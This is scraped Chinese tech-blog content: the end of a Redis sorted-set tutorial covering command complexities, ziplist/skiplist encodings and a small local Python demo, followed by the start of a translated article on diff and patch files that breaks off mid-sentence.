-->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/78686fc08428a438b20a0820ba816e1b.png\" width=\"669\" height=\"483\"></p>\n<p>zunionstore 命令的相关参数和 zinterstore 命令相同。</p>\n<p> </p>\n<h2>时间复杂度</h2>\n<table cellspacing=\"0\" cellpadding=\"0\">\n<tbody>\n<tr>\n<td>命令</td>\n<td>时间复杂度</td>\n</tr>\n<tr>\n<td>zadd key [NX/XX] [CH] [INCR] score member [score member …]</td>\n<td>O(k*log(n))，k是添加元素的个数，n是当前有序集合元素个数</td>\n</tr>\n<tr>\n<td>zcard key</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>zscore key member</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>zrank key member</td>\n<td>O(log(n))，n是当前有序集合元素个数</td>\n</tr>\n<tr>\n<td>zrevrank key member</td>\n<td>O(log(n))，n是当前有序集合元素个数</td>\n</tr>\n<tr>\n<td>zrem key member [member …]</td>\n<td>O(k*log(n))，k是删除元素的个数，n是当前有序集合元素个数</td>\n</tr>\n<tr>\n<td>zincrby key increment member</td>\n<td>O(log(n))，n是当前有序集合元素个数</td>\n</tr>\n<tr>\n<td>zrange key start stop [WITHSCORES]</td>\n<td>O(log(n) + k),k是要获取的元素个数，n是当前有序集合个数</td>\n</tr>\n<tr>\n<td>zrevrange key start stop [WITHSCORES]</td>\n<td>O(log(n) + k),k是要获取的元素个数，n是当前有序集合个数</td>\n</tr>\n<tr>\n<td>zrangebyscore key min max [WITHSCORES] [LIMIT offset count]</td>\n<td>O(log(n) + k),k是要获取的元素个数，n是当前有序集合个数</td>\n</tr>\n<tr>\n<td>zrevrangebyscore key max min [WITHSCORES] [LIMIT offset count]</td>\n<td>O(log(n) + k),k是要获取的元素个数，n是当前有序集合个数</td>\n</tr>\n<tr>\n<td>zcount key min max</td>\n<td>O(log(n))，n是当前有序集合元素个数</td>\n</tr>\n<tr>\n<td>zremrangebyrank key start stop</td>\n<td>O(log(n) + k),k是要删除的元素个数，n是当前有序集合个数</td>\n</tr>\n<tr>\n<td>zremrangebyscore key min max</td>\n<td>O(log(n) + k),k是要删除的元素个数，n是当前有序集合个数</td>\n</tr>\n<tr>\n<td>zinterstore destination numkeys key [key …] [WEIGHTS weight] [AGGREGATE SUM/MIN/MAX]</td>\n<td>O(n k) + O(m log(m)),n是元素元素最小的有序集合元素个数，k是有序集合个数，m是结果集中元素个数</td>\n</tr>\n<tr>\n<td>zunionstore destination numkeys key [key …] [WEIGHTS weight] [AGGREGATE SUM/MIN/MAX]</td>\n<td>O(n) + O(m * log(m)),n是所有有序集合元素个数和，m是结果集中元素个数。</td>\n</tr>\n</tbody>\n</table>\n<p> </p>\n<h2>内部编码</h2>\n<p>有序集合类型的内部编码有两种，它们分别是：</p>\n<ul>\n<li>ziplist(压缩列表)：当有序集合的元素个数小于 128 个(默认设置)，同时每个元素的值都小于 64 字节(默认设置)，Redis 会采用 ziplist 作为有序集合的内部实现。</li>\n<li>skiplist(跳跃表)：当上述条件不满足时，Redis 会采用 skiplist 作为内部编码。</li>\n</ul>\n<p>备注：上述中的默认值，也可以通过以下参数设置：zset-max-ziplist-entries 和 zset-max-ziplist-value。</p>\n<p>下面我们用以下示例来验证上述结论。</p>\n<p>当元素个数比较少，并且每个元素也比较小时，内部编码为 ziplist:</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/e931308682681fbe62180e41ba7a7dac.png\" width=\"522\" height=\"112\"></p>\n<p>当元素个数超过 128 时，内部编码为 skiplist。下面我们将采用 python 动态创建128个元素，下面为源码：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0892fb411298800\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nimport redis\r\n\r\nr = redis.Redis(host='127.0.0.1', port=6379)\r\nif r.object('encoding', 'zsetkey') != None:\r\n    print('Key为【zsetkey】的字节编码为【%s】' % r.object('encoding', 'zsetkey').decode('utf-8'))\r\nfor i in range(1, 600):\r\n    r.zadd('zsetkey',i,1)\r\nif r.object('encoding', 'zsetkey') != None:\r\n    print('Key为【zsetkey】的字节编码为【%s】' % r.object('encoding', 'zsetkey').decode('utf-8'))\r\nKey为【zsetkey】的字节编码为【ziplist】\r\nKey为【zsetkey】的字节编码为【skiplist】</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892fb411298800-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad0892fb411298800-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892fb411298800-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad0892fb411298800-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892fb411298800-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad0892fb411298800-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892fb411298800-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad0892fb411298800-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892fb411298800-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad0892fb411298800-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892fb411298800-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0892fb411298800-1\"><span class=\"crayon-e\">import </span><span class=\"crayon-i\">redis</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad0892fb411298800-2\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6ad0892fb411298800-3\"><span class=\"crayon-v\">r</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Redis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">host</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'127.0.0.1'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">port</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">6379</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad0892fb411298800-4\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">.</span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'encoding'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'zsetkey'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">None</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6ad0892fb411298800-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">print</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'Key为【zsetkey】的字节编码为【%s】'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">.</span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'encoding'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'zsetkey'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">decode</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'utf-8'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad0892fb411298800-6\"><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">600</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6ad0892fb411298800-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">zadd</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'zsetkey'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad0892fb411298800-8\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">.</span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'encoding'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'zsetkey'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">None</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6ad0892fb411298800-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">print</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'Key为【zsetkey】的字节编码为【%s】'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">.</span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'encoding'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'zsetkey'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">decode</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'utf-8'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad0892fb411298800-10\"><span class=\"crayon-i\">Key</span>为【<span class=\"crayon-i\">zsetkey</span>】的字节编码为【<span class=\"crayon-i\">ziplist</span>】</div><div class=\"crayon-line\" id=\"crayon-5bab6ad0892fb411298800-11\"><span class=\"crayon-i\">Key</span>为【<span class=\"crayon-i\">zsetkey</span>】的字节编码为【<span class=\"crayon-i\">skiplist</span>】</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0030 seconds] -->\r\n<p>当有序集合中有任何一个元素大于 64 个字节时，内部编码为 skiplist。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad089300059092210\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nimport redis\r\n\r\nr = redis.Redis(host='127.0.0.1', port=6379)\r\nif r.object('encoding', 'zsetkey') != None:\r\n    print('Key为【zsetkey】的字节编码为【%s】' % r.object('encoding', 'zsetkey').decode('utf-8'))\r\nvalue = ''\r\nfor i in range(1, 600):\r\n    value += str(i)\r\nr.zadd('zsetkey',value,1)\r\nif r.object('encoding', 'zsetkey') != None:\r\n    print('Key为【zsetkey】的字节编码为【%s】' % r.object('encoding', 'zsetkey').decode('utf-8'))\r\nKey为【zsetkey】的字节编码为【skiplist】</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089300059092210-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad089300059092210-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089300059092210-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad089300059092210-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089300059092210-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad089300059092210-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089300059092210-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad089300059092210-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089300059092210-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad089300059092210-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089300059092210-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad089300059092210-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad089300059092210-1\"><span class=\"crayon-e\">import </span><span class=\"crayon-i\">redis</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad089300059092210-2\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6ad089300059092210-3\"><span class=\"crayon-v\">r</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Redis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">host</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'127.0.0.1'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">port</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">6379</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad089300059092210-4\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">.</span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'encoding'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'zsetkey'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">None</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6ad089300059092210-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">print</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'Key为【zsetkey】的字节编码为【%s】'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">.</span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'encoding'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'zsetkey'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">decode</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'utf-8'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad089300059092210-6\"><span class=\"crayon-v\">value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">''</span></div><div class=\"crayon-line\" id=\"crayon-5bab6ad089300059092210-7\"><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">600</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad089300059092210-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">str</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6ad089300059092210-9\"><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">zadd</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'zsetkey'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">value</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad089300059092210-10\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">.</span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'encoding'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'zsetkey'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">None</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6ad089300059092210-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">print</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'Key为【zsetkey】的字节编码为【%s】'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">.</span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'encoding'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'zsetkey'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">decode</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'utf-8'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad089300059092210-12\"><span class=\"crayon-i\">Key</span>为【<span class=\"crayon-i\">zsetkey</span>】的字节编码为【<span class=\"crayon-i\">skiplist</span>】</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0030 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/444a9a4b6f2bb75f08572f25d7d8d534.png\" width=\"760\" height=\"186\"></p>\n<p>到这里，本文就结束了，写了这么多，其实主要大部分是关于命令的简单介绍，其中也介绍了一些关键要点，如有不正确的地方，欢迎留言。</p>\n<p> </p>\n<h1>作者介绍</h1>\n<p>裴彬，Java 工程师，喜欢编程，自己开发的博客系统已上线：jilinwula.com</p>\n<p> </p>\n<div>\n<div><!-- oschina-blog-728x90 --> <ins></ins></div>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114407\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114407votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114407\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/c766feed221138f7946130756cddfc7e86e388b4.jpg"}
{"title": "差异文件（diff）和补丁文件（patch）简介", "url": "http://blog.jobbole.com/114385/", "create_date": "2018/09/15", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/09/3e2e21811bc26c0e4b76ce72d72cb95b.jpg"], "url_object_id": "638fc4a89ff5df94f6a2b95b83d84d1e", "praise_nums": 1, "fav_nums": 0, "comment_nums": 0, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/18/8/diffs-patches\">Phil Estes</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-10005-1.html\">Linux中国/DavidChenLiang</a>   </div><p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/3e2e21811bc26c0e4b76ce72d72cb95b.jpg\"></p>\n<p>如果你曾有机会在一个使用分布式开发模型的大型代码库上工作过，你就应该听说过类似下面的话，“Sue 刚发过来一个补丁patch”，“Rajiv 正在签出checking out差异diff”, 可能这些词（补丁、差异文件）对你而言很陌生，而你确定很想搞懂他们到底指什么。开源软件对上述提到的名词有很大的贡献，作为大型项目从 Apache web 服务器到 Linux 内核的开发模型，“基于补丁文件的开发” 这一模式贯穿了上述项目的始终。实际上，你可能不知道 Apache 的名字就来自“一系列的代码补丁”（LCTT 译注：Apache 英文发音和补丁的英文 patch 相似)，它们被一一收集起来并针对原来的 <a href=\"https://github.com/TooDumbForAName/ncsa-httpd\">NCSA HTTPd server source code</a> 进行了修订。</p>\n<p>你可能认为这只不过是些逸闻，但是一份早期的 <a href=\"https://web.archive.org/web/19970615081902/http:/www.apache.org/info.html\">Apache 网站的存档中</a> 声称 Apache 的名字就是来自于最早的“补丁”集合；即“打了补丁的APAtCHy”服务器，简化为 Apache。</p>\n<p>好了，言归正传，程序员嘴里说的“差异”和“补丁”到底是什么？</p>\n<p>首先，在这篇文章里，我们可以认为这两个术语都指向同一个概念。“diff” 是 ”difference“ 的简写；Unix 下的同名工具程序 <code>diff</code>剖析了一个或多个文件之间的“差异”。下面我们会看到 <code>diff</code> 的例子:</p>\n<p>一个“补丁”指的是文件之间一系列差异，这些差异能被 Unix 的 <code>diff</code> 程序应用在源代码树上。我们能使用 <code>diff</code> 工具来创建“差异”（或“补丁”），然后使用该工具将它们 “打” 在一个没有这个补丁的同样的源代码版本上。此外，（我又要开始跑题说些历史轶事了……），“补丁” 这个词真的指在计算机的早期使用打卡机的时候，用来覆盖在打孔纸带上来对软件进行修改的覆盖纸，那个时代打孔纸带就是在计算机处理器上运行的程序。下面来自 <a href=\"https://en.wikipedia.org/wiki/Patch_(computing)\">维基页面</a> 的这张图真切的描绘了最初的“打补丁”这个词的出处:</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/f87c32c99b1a3572a394387d6b5386df.jpg\" alt=\"\"></p>\n<p>现在你对补丁和差异就了一个基本的概念，让我们来看看软件开发者是怎么使用这些工具的。如果你还没有使用过类似于 <a href=\"https://git-scm.com/\">Git</a> 或 <a href=\"https://subversion.apache.org/\">subversion</a> 这样的源代码版本控制工具的话，我将会一步步展示最流行的软件项目是怎么使用它们的。如果你将一个软件的生命周期看成是一条时间线的话，你就能看见这个软件的点滴变化，比如在何时源代码加上了一个功能，在何时源代码修复了一个功能缺陷。我们称这些改变的点为“提交commit”，“提交”这个词被当今最流行的源代码版本管理工具 Git 所使用，当你想检查在一个提交前后的代码变化的话，（或者在许多个提交之间的代码变化），你都可以使用工具来观察文件差异。</p>\n<p>如果你同样在使用 Git 开发软件的话，你可以在你的本地开发环境做些希望交给别的开发者的提交，以添加到他们的源代码树中。为了给别的开发者你的提交，一个方法就是创建一个你本地文件的差异文件，然后将这个“补丁”发送给和你工作在同一个源代码树的别的开发者。别的开发者在“打”了你的补丁之后，就能看到在你的代码变树上的变化。</p>\n<h3 id=\"toc_1\">Linux、Git 和 GitHub</h3>\n<p>这种分享补丁的开发模型正是现今 Linux 内核社区如何处理内核修改提议而采用的模型。如果你有机会浏览任何一个主流的 Linux 内核邮件列表 —— 主要是 <a href=\"https://lkml.org/\">LKML</a>，也包括 <a href=\"https://lists.linuxfoundation.org/pipermail/containers/\">linux-containers</a>、<a href=\"https://patchwork.kernel.org/project/linux-fsdevel/list/\">fs-devel</a>、<a href=\"https://www.spinics.net/lists/netdev/\">Netdev</a> 等等，你能看到很多开发者会贴出他们想让其他内核开发者审核、测试或者合入 Linux 官方 Git 代码树某个位置的补丁。当然，讨论 Git 不在这篇文章范围之内（Git 是由 Linus Torvalds 